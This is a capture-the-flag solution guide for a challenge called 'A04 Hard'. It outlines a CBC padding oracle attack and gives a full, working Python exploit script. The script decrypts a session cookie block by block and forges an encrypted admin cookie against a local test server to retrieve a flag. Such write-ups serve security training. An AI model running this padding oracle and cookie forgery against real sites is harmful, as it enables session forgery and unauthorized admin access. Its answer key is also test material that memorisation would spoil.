# A04 Hard: Solution Guide

### Exploitation Strategy
1. Obtain the guest cookie `base64(IV + C1 + C2)`.
2. Decrypt `C2` and `C1` byte-by-byte using the padding oracle response (testing 256 candidate values per byte).
3. Target plaintext: `{"role": "admin", "id": 999}` with valid PKCS#7 padding.
4. Using CBC encryption properties in reverse:
   - Encrypt block 2: `New_C1 = Decrypt(Dummy_Zero_Block, C2) XOR Target_P2`
   - Encrypt block 1: `New_IV = Decrypt(Dummy_Zero_Block, New_C1) XOR Target_P1`
5. Send `Cookie: session_auth=base64(New_IV + New_C1 + C2)` to access the admin portal and capture the flag.

### Python Exploit Script
```python
import requests
import base64
import urllib.parse
import sys
import re

TARGET = "http://127.0.0.1:6012"

def oracle(forged_prev, target_block):
    payload = base64.b64encode(bytes(forged_prev) + target_block).decode('utf-8')
    r = requests.get(TARGET, headers={"Cookie": f"session_auth={payload}"})
    return "invalid padding bytes" not in r.text.lower()

def xor_bytes(b1, b2):
    return bytes(x ^ y for x, y in zip(b1, b2))

def decrypt_block(prev_block, block):
    intermediate = bytearray(16)
    for padding_val in range(1, 17):
        target_idx = 16 - padding_val
        forged_prev = bytearray(16)
        for i in range(target_idx + 1, 16):
            forged_prev[i] = intermediate[i] ^ padding_val
        for guess in range(256):
            forged_prev[target_idx] = guess
            if oracle(forged_prev, block):
                if padding_val == 1 and target_idx > 0:
                    forged_prev[target_idx - 1] ^= 1
                    if not oracle(forged_prev, block):
                        forged_prev[target_idx - 1] ^= 1
                        continue
                intermediate[target_idx] = guess ^ padding_val
                break
    return xor_bytes(intermediate, prev_block), intermediate

def encrypt_block(target_plaintext, next_block):
    dummy_prev = b"\x00" * 16
    _, intermediate = decrypt_block(dummy_prev, next_block)
    return xor_bytes(intermediate, target_plaintext)

# Obtain guest cookie
r = requests.get(TARGET)
cookie_val = r.headers.get("Set-Cookie").split("session_auth=")[1].split(";")[0]
cookie = base64.b64decode(urllib.parse.unquote(cookie_val))
iv, c1, c2 = cookie[0:16], cookie[16:32], cookie[32:48]

# Forge admin cookie
target_pt = b'{"role": "admin", "id": 999}'
pad_len = 16 - (len(target_pt) % 16)
target_pt += bytes([pad_len] * pad_len)
t_p1, t_p2 = target_pt[0:16], target_pt[16:32]

new_c2 = c2
new_c1 = encrypt_block(t_p2, new_c2)
new_iv = encrypt_block(t_p1, new_c1)
forged_cookie = base64.b64encode(new_iv + new_c1 + new_c2).decode('utf-8')

resp = requests.get(TARGET, headers={"Cookie": f"session_auth={forged_cookie}"})
print("Result Flag:", re.search(r'RTSA\{.*?\}', resp.text).group(0))
```
